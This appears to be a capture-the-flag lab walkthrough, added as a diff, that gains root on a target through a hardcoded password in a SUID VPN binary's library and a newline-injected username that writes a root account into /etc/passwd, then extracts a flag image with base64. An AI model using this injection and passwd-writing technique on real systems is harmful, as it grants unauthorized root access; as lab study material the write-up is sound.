@@ -1,0 +1,60 @@
+# Target
+9009/tcp open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+
+ssh -p 9009 admin@172.15.27.21
+password: password
+
+# Find SUID binary
+find / -perm -4000 2>/dev/null
+	/opt/vpn_connect
+
+Usage:
+	./vpn_connect -u <user> -p <password -l <log_path>
+
+ldd /opt/vpn_connect
+	libvpnauthcustom.so => /usr/lib/libvpnauthcustom.so (0x00007f581036d000)
+
+strings /usr/lib/libvpnauthcustom.so
+	username
+	securePass
+
+/opt/vpn_connect -u a -p b -l /opt/test
+	In test
+	```
+	Attempting to connect to server with a and b
+
+	Connection handled
+
+	Authentication failed
+	```
+
+ls -al /etc/ace_of_clubs.png
+	-r-------- 1 new root 80746 Dec  1 14:55 /etc/ace_of_clubs.png
+
+Create a user `new` to read it
+
+openssl passwd -1 -salt new 123
+	$1$new$p7ptkEKU1HnaHpRtzNizS1
+
+# Execute bash
+bash
+
+# Write in /etc/passwd
+/opt/vpn_connect -u $'\nnew:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash\n' -p securePass -l /etc/passwd
+
+
+cat /etc/passwd
+	Attempting to connect to server with
+	new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
+	 and securePass
+
+	Connection handled
+
+	Authentication failed
+
+su new
+	123
+
+base64 /etc/ace_of_clubs.png
+
+cat base64_encode | base64 -d > ace_of_clubs.png
